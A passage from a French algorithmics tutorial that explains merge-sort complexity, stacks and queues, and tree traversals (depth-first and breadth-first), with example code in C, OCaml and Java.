étapes de découpe, on se retrouve avec 16 tableaux à fusionner ! Oui, mais ces tableaux sont petits, ils ont chacun $\\frac{N}{16}$ élément. Au total, on a donc $16 \\times \\frac{N}{16} = N$ opérations lors des fusions de ces tableaux : à chaque étape, on a $O(N)$ opérations de fusion. On a donc $log(N)$ étapes à $O(N)$ opérations chacune. Au total, cela nous fait donc $O(N \\times log(N))$ opérations : la complexité du tri fusion est en $O(N \\times log(N))$ (parfois noté simplement $O(N log N)$, la multiplication est sous-entendue). Efficacité en pratique On est passé, en changeant d'algorithme, d'une complexité de $O(N&#94;2)$ à une complexité de $O(N \\times log(N))$. C'est bien gentil, mais est-ce si génial que ça ? La réponse est oui : $O(N log(N))$ ça va vraiment beaucoup plus vite. Pour vous en convaincre, voici des timings concrets comparant une implémentation du tri par sélection (avec des tableaux) et du tri par fusion (avec des listes), le tout dans le même langage de programmation et sur le même (vieil) ordinateur pour pouvoir comparer : N sélection fusion 100 0.006s 0.006s 1000 0.069s 0.010s 10 000 2.162s 0.165s 20 000 7.526s 0.326s 40 000 28.682s 0.541s Les mesures confirment ce que nous avons expliqué jusqu'à présent. On parle bien d'une complexité asymptotique , pour des $N$ grands. Quand $N$ est petit, les deux algorithmes sont à peu près équivalents (pour un petit nombre d'éléments, le tri par insertion va même un peu plus vite que le tri par fusion). La différence se fait sur de grandes valeurs, mais surtout elle caractérise l' évolution des performances quand les demandes changent. Avec une complexité de $O(N&#94;2)$, si on double la taille de l'entrée, le tri par sélection va environ 4 fois plus lentement (c'est assez bien vérifié sur nos exemples). Avec une complexité de $O(N \\times log(N))$, cela va seulement un peu plus de 2 fois plus lentement environ (vu les petits temps de calcul, les mesures sont plus sensibles aux variations, donc moins fiables). En extrapolant ce comportement, on obtient sur de très grandes données un fossé absolument gigantesque. Par exemple, dans ce cas précis, le tri fusion sur 10 millions d'éléments devrait prendre environ une demi heure, alors que pour un tri par sélection il vous faudra... un an et demi. Ce genre de différences n'est pas un cas rare. On est passé d'un facteur $N$ à un facteur $log(N)$, ce qui est plutôt courant quand on passe d'un code \"naïf\" (sans réflexion algorithmique) à quelque chose d'un peu mieux pensé. Cela vous donne une idée des gains que peut vous apporter une connaissance de l'algorithmique. Le passage des tris quadratique aux tri par fusion était impressionnant. Est-ce que dans le prochain chapitre, je vais encore vous décoiffer avec quelque chose d'encore plus magique ? Un tri en $O(log(N))$ ? Un tri qui renvoie la sortie avant qu'on lui ai donné l'entrée ? La réponse est non. On dit que le tri fusion est \"optimal\" parmi les tris par comparaison, c'est à dire qui trient en comparant les élément deux par deux. Si on ne connaît rien des données que l'on trie, on ne peut pas les trier avec une meilleure complexité. Si l'on avait des informations supplémentaires, on pourrait peut-être faire mieux (par exemple si on sait que toutes les valeurs sont égales, bah on ne s'embête pas, on renvoie la liste directement), mais pas dans le cas général. Ce résultat assez étonnant sera montré dans la dernière partie de ce tutoriel (qui n'est pas encore écrite : vous devrez attendre). Ça ne veut pas dire que le tri par fusion est le meilleur tri qui existe. Il existe d'autres tris (de la même complexité, voire parfois moins bonne dans le pire des cas) qui sont plus rapides en pratique. Mais d'un point de vue algorithmique, vous ne pourrez pas faire beaucoup mieux. Remarque : c'est le moment de mentionner un petit détail intéressant, qui sort du cadre de l'algorithmique proprement dite. On a déjà expliqué que la mesure de la complexité était de nature asymptotique , c'est à dire qu'elle n'était pertinente que pour de grandes valeurs, à une constante multiplicative près. Il se trouve que pour des petites valeurs (disons jusqu'à 20, 50 ou 100 éléments par exemple), le tri par insertion, bien que quadratique, est très efficace en pratique. On peut donc donner un petit coup de pouce au tri par fusion de la manière suivante : au lieu de couper la liste en deux jusqu'à qu'elle n'ait plus qu'un seul élément, on la coupe jusqu'à qu'elle ait un petit nombre d'éléments, et ensuite on applique un tri par insertion. Comme on n'a changé l'algorithme que pour les \"petites valeurs\", le comportement asymptotique est le même et la complexité ne change pas, mais cette variante est un peu plus rapide. Ce genre de petits détails, qui marchent très bien en pratique, sont là pour nous empêcher d'oublier que l'approche algorithmique n'est pas la réponse à toutes les questions de l'informatique. C'est un outil parmi d'autres, même si son importance est capitale. Je pense que vous avez maintenant acquis les bases de l'algorithmique. Si vous avez bien compris tout ce qui a été dit jusque là, vous devriez être capable de vous faire vous-même une idée sur la complexité des algorithmes simples, et d'intégrer cette réflexion dans votre manière de programmer. Ne vous attendez pas cependant à faire des merveilles dès maintenant. Le \"sens de la complexité\" (la capacité à évaluer la complexité de son travail, sans forcément rentrer dans des précisions formelles pointues) demande de la pratique, il faut que cela devienne une habitude. Dans la prochaine partie, nous vous présenterons d'autres algorithmes courants, que vous rencontrerez sans doute dans de nombreuses situations, et qui agrandiront donc à la fois votre trousse à outils algorithmique, et votre capacité à estimer les complexités. Le choix du cours est donc le suivant : restez sur votre chaise, lisez (... quand ils seront disponibles !) les prochains chapitres, faites les exercices proposés (et d'autres en plus si vous voulez), et vous apprendrez beaucoup de chose. Il y a d'autres sources d'informations disponibles, et je voudrais en mentionner une en particulier : France-IOI. C'est une association qui prépare, à travers une série d'exercices d'algorithmiques, à des compétitions d'informatique. Ce ne sont pas les compétitions qui m'intéressent ici, mais leurs exercices : ils sont variés, formateurs, et corrigés avec soin. Leur idée est de former les visiteurs à l'algorithmique à travers une série d'exercice progressifs à chercher. Si vous avez envie d'un peu de pratique, n'hésitez pas à y jeter un coup d'œil. Bien sûr, le concept n'est pas unique et il existe d'autres sites d'exercices (comme Project Euler , qui est malheureusement plus orienté mathématiques) et de descriptions d'algorithmes (par exemple la wikipédia). N'hésitez pas à vous renseigner et travailler par vous-même. Quelques autres structures de données courantes Piles et files On a vu que les listes représentaient des suites d'éléments que l'on pouvait facilement agrandir ou rétrécir selon ses besoins. Il se trouve qu'en pratique, certaines manières d'ajouter ou d'enlever des éléments reviennent très souvent, et on leur a donc donné un nom pour les repérer plus facilement : les piles et les files . Concept Imaginez que l'on manipule une liste d'éléments qui évolue au cours du temps : on peut en ajouter et en retirer. Supposons que l'on ajoute toujours les éléments au début de la liste. Pour retirer les éléments, il y a deux possibilités simples qu'il est intéressant d'étudier : le cas où on retire toujours les éléments au début de la liste le cas où on retire toujours les éléments à la fin de la liste Ces deux cas de figures se retrouvent très souvent dans la vie de tous les jours. Dans le premier cas, on dit qu'on utilise une structure de pile , dans le deuxième cas une structure de file . Par exemple, imaginez qu'un professeur a donné un devoir à ses élèves, à faire en temps limité. Un peu avant la fin, certains élèves commencent à rendre leur copie en avance. Le professeur décide de commencer à corriger les copies qu'il reçoit, pour gagner du temps. Il y a une pile de copies sur son bureau, et : quand un élève a terminé, il rend sa copie au professeur qui la pose sur la pile de copie quand il a terminé de corriger une copie, il prend la première copie sur la pile pour la corriger Cela correspond bien à ce que j'ai appelé une pile . On décrit souvent ce comportement par l'expression dernier entré, premier sorti (ou LIFO , de l'anglais Last In, First Out ) : la dernière copie rendue est la première à être corrigée. Au contraire, quand vous faites la queue devant la caisse d'un supermarché, cela correspond bien à une file d'attente : les clients arrivent d'un côté de la queue (au \"début de la queue\"), et la caissière est à l'autre bout (à la \"fin de la queue\"). Quand elle a terminé de compter les achats d'un client, elle fait passer le client qui est à la fin de la queue. C'est le comportement premier entré, premier sorti (ou FIFO , First In, First Out ). Question : Imaginez un boulanger qui fait cuire du pain, le stocke puis le vend à ses clients. Les clients aiment bien avoir du pain le plus frais possible (qui sort tout juste du four), et le boulanger ne peut pas leur vendre de pain trop sec (qui est sorti du four depuis trop longtemps). Quels sont les avantages d'une pile ou d'une file dans ce cas ? Quelle structure choisiriez-vous ? S'il utilise une pile, il vendra toujours le pain le plus frais possible à ses clients : à chaque client il donnera le pain en début de pile, c'est à dire celui qui vient de sortir du four. Par contre, le pain en fin de pile risque d'attendre trop longtemps, et le boulanger devra peut-être le jeter. S'il utilise une file, il vend toujours du pain un peu moins frais à ses clients, mais le pain ne reste jamais indéfiniment chez le boulanger, donc il ne risque pas de trop sécher. En pratique, les boulangers n'appliquent aucune de ces méthodes : ils font le matin le pain pour la journée, en s'arrageant pour avoir tout vendu le soir, donc le pain n'attend jamais plus d'un jour chez le boulanger. Mise en pratique Piles Les piles sont très simples, parce que ce sont essentiellement des listes. On a vu qu'avec une liste, il était facile d'ajouter et de retirer des éléments en tête de liste. Cela fait exactement une pile. Voici un exemple de code C pour gérer les piles, qui réutilise le type List définit pour les listes. Pour ajouter un élément on utilise push , et pop pour enlever un élément et récupérer sa valeur. typedef List * Stack ; Stack * new_stack ( void ) { Stack * stack ; if (( stack = malloc ( sizeof * stack )) == NULL ) return NULL ; * stack = NULL ; return stack ; } void free_stack ( Stack * stack ) { free_list ( * stack ); free ( stack ); } int stack_is_empty ( Stack * stack ) { return * stack == NULL ; } int stack_push ( Stack * stack , int elem ) { List * pushed ; if (( pushed = cons ( elem , * stack )) == NULL ) return - 1 ; * stack = pushed ; return 0 ; } int stack_pop ( Stack * stack , int * elem ) { List * tail ; if ( * stack == NULL ) return - 1 ; tail = ( * stack ) -> next ; * elem = ( * stack ) -> val ; free ( * stack ); * stack = tail ; return 0 ; } La même chose en Caml : let new_stack () = ref [] let stack_is_empty stack = ! stack = [] let stack_push stack elem = stack := elem :: ! stack let stack_pop stack = let old = ! stack in stack := List . tl old ; List . hd old N'hésitez pas à le recoder dans votre langage préféré. Même si ça existe déjà dans la bibliothèque standard, ça fait toujours un peu d'entraînement ! Files Les files sont un peu plus délicates : si on retire les éléments en tête de liste (au début de la liste), il faut ajouter les éléments à la fin de la liste. C'est quelque chose que l'on ne fait pas d'habitude, car ce n'est pas pratique : dans une liste, on connaît le premier élément, mais pour accéder au dernier élément il faut parcourir toute la liste jusqu'à la fin, ce qui est lent (complexité linéaire). On va donc créer une structure supplémentaire, qui contient une liste, mais qui stocke aussi la cellule correspondant à son dernier élément, pour pouvoir y accéder (et rajouter de nouveaux éléments derrière). Remarque : pour définir les piles et les files, j'ai parlé d'ajouter les éléments en début de liste, et de les retirer soit au début (pour les piles) soit à la fin (pour les files). Mon implémentation concrète des files va en fait dans l'autre sens : je retire les éléments en début de liste, et je les ajoute à la fin. Bien sûr, ça ne change rien au comportement de la file. Exercice : Codez les opérations push et pop pour une file (ou queue , terme utilisé en anglais) dans votre langage préféré. Correction en C : struct queue { List * input ; List * output ; }; typedef struct queue Queue ; Queue * new_queue ( void ) { Queue * queue ; if (( queue = malloc ( sizeof * queue )) == NULL ) return NULL ; queue -> input = NULL ; queue -> output = NULL ; return queue ; } void free_queue ( Queue * queue ) { free_list ( queue -> output ); free ( queue ); } int queue_is_empty ( Queue * queue ) { return queue -> input == NULL ; } int queue_push ( Queue * queue , int elem ) { List * cell ; if (( cell = cons ( elem , NULL )) == NULL ) return - 1 ; if ( queue_is_empty ( queue )) queue -> output = cell ; /* output was NULL, set it to the single cell */ else queue -> input -> next = cell ; queue -> input = cell ; return 0 ; } int queue_pop ( Queue * queue , int * elem ) { List * cell ; if (( cell = queue -> output ) == NULL ) return - 1 ; * elem = cell -> val ; queue -> output = cell -> next ; if ( queue -> output == NULL ) /* empty queue */ queue -> input = NULL ; free ( cell ); return 0 ; } Correction en caml : Le type des listes standard en caml ne convient pas ici : il faut pouvoir modifier les liens avec les éléments, ce qui n'est pas possible avec le type 'a list . On définit donc notre propre type de donnée 'a mutlist , qui représente des listes (non vides) dont la queue est modifiable (champ mutable ). type ' a mutlist = { elem : ' a ; mutable next : ' a mutlist option } type ' a queue = ( ' a mutlist * ' a mutlist ) option ref let new_queue () = ref None let queue_is_empty queue = ! queue = None let queue_push queue elem = let cell = { elem = elem ; next = None } in queue := match ! queue with | None -> Some ( cell , cell ) | Some ( input , output ) -> input . next <- Some cell ; Some ( cell , output ) let queue_pop queue = match ! queue with | None -> failwith \"empty queue\" | Some ( input , output ) -> queue := ( match output . next with | None -> None | Some tail -> Some ( input , tail )); output . elem Si vous avez des difficultés à faire cet exercice, ou à adapter les solutions à votre langage préféré, n'hésitez pas à créer un topic sur dans le forum adapté à votre langage. La plupart des langages de programmation proposent des bibliothèques qui permettent d'utiliser des piles ou des files, sans avoir à les recoder vous-même. Ces structures apparaissent naturellement dans un certain nombre de problèmes ou de situations de tous les jours, et nous les rencontrerons à nouveau par la suite, au sein d'algorithmes plus compliqués. Arbres Les structures de données que nous avons vu jusqu'ici (tableaux, listes, piles, files) sont linéaires , dans le sens où elles stockent les éléments les uns à la suite des autres : on peut les représenter comme des éléments placés sur une ligne, ou des oiseaux sur un fil électrique. Au bout d'un moment, les oiseaux se lassent de leur fil électrique : chaque oiseau a deux voisins, et c'est assez ennuyeux, pas pratique pour discuter. Ils peuvent s'envoler vers des structures plus complexes, à commencer par les arbres . Définition Un arbre est une structure constituée de nœuds , qui peuvent avoir des enfants (qui sont d'autres nœuds). Sur l'exemple, le nœud B a pour enfant les nœuds D et E, et est lui-même l'enfant du nœud A. Deux types de noeuds ont un statut particulier : les noeuds qui n'ont aucun enfant, qu'on appelle des feuilles , et un noeud qui n'est l'enfant d'aucun autre noeud, qu'on appelle la racine . Il n'y a forcément qu'une seule racine, sinon cela ferait plusieurs arbres disjoints. Sur l'exemple, A est la racine et D, E, G, H, I sont les feuilles. Bien sûr, on ne s'intéresse en général pas seulement à la structure de l'arbre (quelle est la racine, où sont les feuilles, combien tel noeud a d'enfants, etc.), mais on veut en général y stocker des informations. On considérera donc des arbres dont chaque noeud contient une valeur (par exemple un entier, ou tout autre valeur représentable par votre langage de programmation préféré). Comme pour les listes, on peut définir les arbres récursivement : \"un arbre est constitué d'une valeur et d'une liste d'arbre (ses enfants)\". Vous pouvez remarquer qu'avec cette description, le concept d'\"arbre vide\" n'existe pas : chaque arbre contient au moins une valeur. C'est un détail, et vous pouvez choisir une autre représentation permettant les arbres vides, de toute manière ce ne sont pas les plus intéressants pour stocker de l'information… Exercice : essayer de représenter l'arbre donné en exemple dans le langage de votre choix. Vous aurez peut-être besoin de définir une structure ou un type pour les arbres. Solutions : Solution en C : #include <stdlib.h> typedef struct arbre Arbre ; typedef struct list List ; struct arbre { int val ; List * enfants ; }; struct list { Arbre * node ; List * next ; }; List * cons ( Arbre * arbre , List * liste ) { List * elem ; if (( elem = malloc ( sizeof * elem )) == NULL ) return NULL ; elem -> node = arbre ; elem -> next = liste ; return elem ; } int main ( void ) { Arbre G = { 'G' , NULL }, H = { 'H' , NULL }, I = { 'I' , NULL }; Arbre F = { 'F' , cons ( & G , cons ( & H , cons ( & I , NULL )))}; Arbre D = { 'D' , NULL }, E = { 'E' , NULL }; Arbre C = { 'C' , cons ( & F , NULL )}; Arbre B = { 'B' , cons ( & D , cons ( & E , NULL ))}; Arbre A = { 'A' , cons ( & B , cons ( & C , NULL ))}; return 0 ; } L'utilisation de la liste n'est pas très pratique ici : les cons allouent de la mémoire, qu'il faudrait libérer ensuite. Pour simplifier la situation (les listes chaînées ne sont pas très agréables à manipuler), les programmeurs C utilisent en général une représentation différente. Au lieu de donner à chaque nœud la liste de ses enfants, on lie les enfants entre eux : chaque enfant a un lien vers son frère , et un nœud a donc juste un lien vers le premier de ses fils. Pour parcourir les autres, il suffit ensuite de passer de frère en frère. typedef struct arbre Arbre ; struct arbre { int val ; Arbre * frere ; Arbre * enfant ; }; int main ( void ) { Arbre I = { 'I' , NULL , NULL }; Arbre H = { 'H' , & I , NULL }; Arbre G = { 'G' , & H , NULL }; Arbre F = { 'F' , NULL , & G }; Arbre E = { 'E' , NULL , NULL }; Arbre D = { 'D' , & E , NULL }; Arbre C = { 'C' , NULL , & F }; Arbre B = { 'B' , & C , & D }; Arbre A = { 'A' , NULL , & B }; return 0 ; } C'est une manière d'intégrer la liste chainée au sein des noeuds de l'arbre qui la rend plus facile à manipuler en C. Solution en Caml : type ' a arbre = Arbre of ' a * ' a arbre list let exemple = let feuille lettre = Arbre ( lettre , [] ) in Arbre ( \"A\" , [ Arbre ( \"B\" , [ feuille \"D\" ; feuille \"E\" ]); Arbre ( \"C\" , [ Arbre ( \"F\" , [ feuille \"G\" ; feuille \"H\" ; feuille \"I\" ])])]) Vous pouvez remarquer qu'on a choisi ici d'utiliser un tableau pour stocker les enfants. Dans ce chapitre, nous manipulerons les arbres comme des structures statiques , sans ajouter ou enlever d'enfants à un nœud particulier, donc ça ne sera pas un problème. Solution en Java : class Tree < T > { T val ; Tree < T >[] enfants ; Tree ( T val ) { this . val = val ; this . enfants = new Tree [ 0 ]; } Tree ( T val , Tree < T >[] enfants ) { this . val = val ; this . enfants = enfants ; } public static void main ( String [] args ) { Tree d = new Tree ( 'D' ); Tree e = new Tree ( 'E' ); Tree g = new Tree ( 'G' ); Tree h = new Tree ( 'H' ); Tree i = new Tree ( 'I' ); Tree [] enfants_de_f = { g , h , i }; Tree f = new Tree ( 'F' , enfants_de_f ); Tree [] enfants_de_b = { d , e }; Tree b = new Tree ( 'B' , enfants_de_b ); Tree [] enfants_de_c = { f }; Tree c = new Tree ( 'C' , enfants_de_c ); Tree [] enfants_de_a = { b , c }; Tree a = new Tree ( 'A' , enfants_de_a ); System . out . println ( a . taille ()); } } Vous pouvez remarquer qu'on a choisi ici d'utiliser un tableau pour stocker les enfants. Dans ce chapitre, nous manipulerons les arbres comme des structures statiques , sans ajouter ou enlever d'enfants à un nœud particulier, donc ça ne sera pas un problème. Remarque : on utilise très souvent en informatique des arbres comportant des restrictions supplémentaires : nombre d'enfants, lien entre les enfants et les parents, etc. En particulier les arbres binaires , où chaque nœud a deux enfants au plus, sont très courants. Pour faire la différence on parle parfois d' arbres n-aires pour les arbres généraux que je présente ici, mais le nom n'est pas très bon et je préfère garder \"arbre\". Quelques algorithmes sur les arbres Pour s'habituer à cette nouvelle structure, on va essayer de formuler quelques algorithmes répondant à des questions simples que l'on peut se poser sur des arbres. Taille On cherche à savoir combien un arbre contient de noeuds. Le raisonnement est très simple : un arbre, c'est un noeud et la liste de ses fils, donc sa taille est un (le noeud), plus la taille des arbre partant de chaque fils : taille(arbre) = 1 + la somme de la taille des fils Voici quelques implémentations de cette fonction dans différents langages. N'hésitez pas à essayer de la coder vous-même avant de regarder une solution ! C : int taille ( Arbre * noeud ) { List * enfants ; int compteur = 1 ; for ( enfants = noeud -> enfants ; enfants != NULL ; enfants = enfants -> next ) compteur += taille ( enfants -> node ); return compteur ; } Ou bien, avec les liens frère-frère : int taille ( Arbre * noeud ) { Arbre * enfant ; int compteur = 1 ; for ( enfant = noeud -> enfant ; enfant != NULL ; enfant = enfant -> frere ) compteur += taille ( enfant ); return compteur ; } OCaml : let rec taille ( Arbre (_, enfants )) = List . fold_left (+) 1 ( List . map taille enfants ) Java : Méthode à rajouter à la classe Tree public int taille () { int compteur = 1 ; for ( Tree <?> enfant : enfants ) compteur += enfant . taille (); return compteur ; } Hauteur On voudrait maintenant connaître la hauteur de l'arbre. La hauteur d'un arbre est la plus grande distance qui sépare un noeud de la racine. La distance d'un noeud à la racine (la hauteur de ce noeud) est le nombre de noeuds sur le chemin entre les deux. On a l'algorithme suivant : hauteur(arbre) = 1 + la plus grande des hauteurs des fils (ou 0 s'il n'y en a pas) Remarque : avec cette définition, la hauteur d'un arbre à un seul élément (juste la racine) est 1; cela ne colle pas vraiment à notre définition de \"distance entre le noeud et la racine\", puisque la distance de la racine à la racine est logiquement 0. C'est un détail de la définition qui peut changer selon les gens, et qui n'est pas vraiment important de toute façon : on ne fait pas dans la dentelle. Remarque : on parle parfois de profondeur plutôt que de hauteur : cela dépend de si vous imaginez les arbres avec la racine en haut et les feuilles en bas, ou (ce qui est plus courant dans la nature) la racine en bas et les branches vers le haut. Liste des éléments Une dernière question à se poser est \"quels sont les éléments présents dans mon arbre ?\". Si vous êtes tombés amoureux des listes et des tableaux, vous aimeriez peut-être avoir accès à ces éléments sous forme de liste ou de tableau. Un tableau ne serait pas très pratique ici, parce qu'il faudrait commencer par calculer la taille de l'arbre; je vais plutôt vous demander d'écrire ici l'algorithme pour obtenir la liste des éléments d'un arbre. Indice : Vous pouvez utiliser deux fonctions sur les listes : reunir_listes(LL) , qui prend une liste de listes et forme une seule liste, la réunion de toutes les petites listes. Par exemple reunir_listes([ [1;3]; []; [2]; [5;1;6] ]) = [1;3;2;5;1;6] . Pour coder reunir_liste , la fonction concat(L1,L2) du chapitre précédent, qui met deux listes bout à bout, vous sera utile. si votre langage le permet, une autre fonction très utile est map(F, L) , qui applique la fonction F à tous les éléments de la liste L et renvoie la liste résultat; par exemple map(ajoute_1, [1;5]) = [2;6] . Sinon, si votre langage ne permet pas de passer des fonctions en argument d'une autre fonction, ou si vous ne savez pas le faire, vous n'aurez qu'à le faire à la main. Remarque : Il existe plusieurs manières de construire la liste des éléments de l'arbre, et on peut obtenir plusieurs listes différentes, avec les mêmes éléments mais placés dans un ordre différent. Correction : Voici un schéma d'algorithme : liste_elements(arbre) = soit elements_enfants = map(liste_elements, enfants) renvoyer cons(element, reunir_listes(elements_enfants)) Parcours en profondeur Les trois algorithmes précédents visitent l'arbre : ils répondent en interrogeant chaque nœud, un par un. Ils ont un point commun, l'ordre dans lequel ils visitent les nœuds de l'arbre est le même à chaque fois. Cet ordre correspond à une méthode de parcours de l'arbre qu'on appelle le parcours en profondeur ; pour chaque nœud : on fait quelque chose avec (demander sa valeur, par exemple) on parcourt chacun de ses enfants, récursivement on fait quelque chose pour réunir les résultats après le parcours (somme, maximum, reunir_listes ) Pourquoi parle-t-on de parcours en profondeur ? Cela vient de l'ordre dans lequel sont parcourus les noeuds. Imaginons un de ces parcours sur l'arbre ci-dessous : on l'appelle sur la racine, A, qui lance le parcours sur chacun de ses enfants, en commençant par B (on suppose que l'ordre des enfants dans la liste est l'ordre de gauche à droite sur le dessin). Pour fournir un résultat, B doit interroger ses propres enfants, donc il commence par lancer le parcours sur son premier fils, D. Ainsi, on voit que le parcours va \"en profondeur\" en commençant par descendre dans l'arbre le plus possible. Pour visualiser tout le parcours, on peut numéroter les noeuds dans l'ordre dans lequel ils sont parcourus : Parcours en largeur La méthode de parcours en profondeur est simple, mais l'ordre dans lequel les noeuds sont parcourus n'est pas forcément très intuitif. En faisait un peu attention (par exemple en essayant de suivre le parcours du doigt), vous serez capable de vous y habituer, mais on pourrait espérer faire quelque chose qui paraisse plus \"naturel\" à un humain. Et si, par exemple, on voulait parcourir notre arbre dans l'ordre alphabétique : A, B, C, D, E.. ? Si cet ordre vous paraît \"logique\", c'est parce que j'ai nommé mes sommets par \"couche\" : on commence par la racine (A), puis on donne un nom à tous les nœuds de \"première génération\" (les enfants de la racine) B et C, puis à tous les noeuds de \"deuxième génération\" (les enfants des enfants de la racine), etc. Remarque : l'algorithme de parcours en largeur est un peu plus compliqué que les algorithmes que j'ai présenté jusqu'ici. Si vous avez des difficultés à comprendre ce qui suit, c'est normal. Essayez de bien faire les exercices, de bien relire les parties qui vous posent problème, et n'hésitez pas à aller demander sur les forums d'aide si vous pensez avoir un vrai problème de compréhension. Vous y arriverez, c'est ce qui compte. En mettant des couches Je cherche maintenant un algorithme qui permet de parcourir les noeuds \"par couche\" de la même manière. On appelle ça le parcours en largeur : on parcourt couche par couche, et dans chaque couche on parcourt toute la \"largeur\" de l'arbre. On va partir de l'idée suivante : pour parcourir l'arbre \"par couche\", il faut essayer de stocker les noeuds dans des couches. Plus précisément, on va maintenir pendant le parcours deux couches : la \"couche courante\", qui contient les noeuds que l'on est en train de parcourir, et la \"couche des enfants\", où on met les enfants de la couche courante. Un peu plus précisément, on a l'algorithme suivant : au départ, on met la racine dans la couche courante, on prend une liste vide pour la couche des enfants ensuite, on parcours les noeuds de la couche courante, en ajoutant leurs enfants dans la couche des enfants quand on a terminé le parcours, on change les couches : on prend la couche des enfants comme nouvelle couche courante, et on recommence le parcours. Quand, à la fin du parcours de la couche courante, on obtient une couche des enfants vide, l'algorithme s'arrête. En effet, s'il n'y a pas d'enfants dans la couche des enfants, cela veut dire qu'aucun des noeuds de la couche qui vient d'être parcourue n'avaient d'enfants : ce n'était que des feuilles, donc on est arrivé à la fin de l'arbre (dans notre exemple la couche G, H, I). Remarque : j'ai parlé d'utiliser des \"listes\" pour représenter les couches. En réalité, on n'utilise vraiment que deux opérations : ajouter un noeud dans une couche, retirer un noeud de la couche (pour le parcours). Les files et les piles sont donc des structures adaptées pour ces opérations (si vous utilisez une simple liste, ça se comportera comme une pile). Le choix d'une file ou d'une pile va changer l'ordre dans lequel les sommets sont parcourus, mais la propriété du parcours en largeur est évidemment conservée dans les deux cas : les noeuds près de la racine sont toujours parcourus avant les noeuds plus loin de la racine, et c'est ce qui est important ici. Exercice : mettre en place l'algorithme avec le noeud donné en exemple (mettre la lettre 'A' comme valeur du noeud A, et ainsi de suite) : parcourir l'arbre en largeur, en affichant la valeur de chaque noeud rencontré. Essayer avec des files et des piles pour représenter les couches : quelle est la différence ? Vérifier que l'ordre des couches est toujours respecté. Avec une file Avec notre algorithme, on stocke les noeuds dans deux structures séparées : les noeuds appartenant à la couche courante, que l'on va bientôt parcourir, et les noeuds de la couche des enfants, que l'on va parcourir plus tard. Est-il possible de conserver ce sens de parcours, en utilisant une seule structure au lieu de deux ? On peut obtenir une réponse à cette question en considérant les deux structures comme une seule : on considère qu'un noeud \"entre\" dans nos structures quand on l'ajoute à la couche des enfants, et qu'il en \"sort\" quand on le prend dans la couche courante pour le parcourir. Pour que notre parcours soit correct, il faut que l'ordre des couches soit respecté : un noeud d'une couche doit entrer avant les noeuds de la couche suivante, et sortir avant tous les noeuds de la couche suivante. Cela correspond donc à une forme de premier entré, premier sorti : première couche entrée, première couche sortie. Ça ne vous rappelle pas quelque chose ? Normalement, si : premier entré, premier sorti, c'est le comportement des files . On peut donc utiliser une file pour stocker les nœuds, car l'ordre de la file respectera l'ordre des couches. On obtient donc l'algorithme suivant : au départ, on commence avec une file vide, dans laquelle on ajoute la racine tant que la file n'est pas vide, on enlève le premier nœud de la file, on le parcourt et on ajoute tous ses enfants dans la file. Exercice : implémenter cet algorithme de parcours, et vérifier que la propriété de parcours en largeur est bien respectée. Comparaison des deux méthodes de parcours Remarque : les programmeurs utilisent souvent la terminologie anglosaxonne pour décrire ces parcours : on parle de DFS (Depth First Search, parcours en profondeur d'abord) et de BFS (Breadth first search, parcours en largeur d'abord). Une symétrie assez surprenante Vous avez sûrement remarqué que les files et les piles sont des structures très proches, qui proposent le même genre d'opérations (ajouter et enlever des éléments). Il est donc naturel de se demander : que se passe-t-il quand, dans l'algorithme de parcours en largeur avec une file, on remplace la file par une pile ? On passe alors d'un régime premier entré, premier sorti à un régime dernier entré, premier sorti . Imaginez qu'on vient de parcourir un noeud : on a ajouté tous ses enfants à la pile, et maintenant on passe au noeud suivant à parcourir. Quel est le noeud suivant qui sera pris ? C'est le dernier noeud entré sur la pile, donc un des enfants du noeud précédent. On se retrouve avec un parcours où, quand on a parcouru un noeud, on parcourt ensuite ses enfants. Ça ne vous rappelle rien ? Si (ou alors vous n'avez pas été asssez attentif) : c'est le parcours en profondeur ! On peut donc implémenter le parcours en profondeur exactement comme le parcours en largeur, en remplaçant la file par une pile. Cela montre que les deux parcours sont très proches, et qu'il y a des liens très forts entre les algorithmes et les structures de données. Choix de l'implémentation Nous avons donc vu deux implémentations de chaque parcours : le parcours en profondeur récursif, le parcours en largeur avec deux couches, le parcours en largeur avec une file et le parcours en profondeur avec une pile. En général, on choisit les algorithmes les plus pratiques : quand on veut faire un parcours en profondeur, on utilise la méthode récursive (qui est plus simple à concevoir et à mettre en oeuvre), et quand on veut faire un parcours en largeur on utilise la méthode avec une file (parce qu'une structure, c'est plus simple que deux). Quand les gens parlent du \"parcours en largeur\", ils font (quasiment) toujours référence à l'implémentation avec une file. Il est quand même utile de connaître les autres implémentations. Tout d'abord, la symétrie entre le parcours en largeur à file et le parcours en profondeur à pile est très jolie (obtenir deux algorithmes différents en changeant juste deux fonctions, c'est quand même assez fort). Ensuite, certains langages (dont je pense le plus grand mal) ne supportent pas bien la récursion, dans ce cas le parcours en profondeur avec une pile peut être un bon choix d'implémentation. Enfin, la méthode de parcours en largeur avec deux couches a un avantage : il est facile de savoir à quelle couche appartient un élément, et donc de mesurer sa \"distance\" au noeud facilement et efficacement. Quand on utilise une file, la distinction entre les deux couches se brouille (on sait que tout arrive dans le bon ordre, mais on ne sait plus exactement où est la coupure entre les couches), et si on a besoin de cette information il faut la maintenir par d'autres méthodes (par exemple en la stockant dans la file avec le noeud, ou dans une structure à part). Exercice : Implémenter un algorithme de parcours en largeur qui affiche la valeur de chaque noeud, ainsi que la distance de ce noeud à la racine. Analyse de complexité Les deux parcours ont une complexité en temps linéaire en la taille de l'arbre (son nombre de noeuds) : en effet, on parcourt chaque noeud une seule fois, et on effectue avant et après quelques opérations (entrée et sortie d'une structure) qui sont en temps constant. Si on a $N$ noeuds dans l'arbre c'est donc du $O(N)$. Pour ce qui est de la complexité mémoire, il faut faire un peu plus attention. Le parcours en profondeur conserve les chemins par lequel il est \"en train de passer\". J'ai donné l'exemple du début du parcours où on passe par les noeuds A, C puis D. Vers la fin du parcours, on sera en train de passer par les noeuds A, C, F puis I. Ces noeuds sont bien présents en mémoire : c'est facile à voir dans la version avec une pile, c'est juste le contenu de la pile; c'est aussi le cas dans la version récursive, car chaque paramètre passé à un appel récursif de la fonction doit être conservé quelque part (pour en savoir plus, vous pouvez lire la description de la pile d'appel dans le tutoriel sur la récursivité , mais ce n'est pas un point important ici). La complexité mémoire du parcours en profondeur est donc en $O(H)$, où $H$ est la profondeur maximale des noeuds de l'arbre, c'est à dire la hauteur de l'arbre. Pour le parcours en largeur, c'est un peu différent : à un instant donné on stocke une partie de la couche courante (ceux qui n'ont pas encore été parcourus), et une partie de la couche des enfants (ceux qui ont déjà été ajoutés). Cela se voit bien dans la version avec deux couches, mais on stocke exactement la même quantité de noeuds dans la version avec pile. La complexité mémoire est donc en $O(L)$ où $L$ est la plus grande largeur d'une couche de 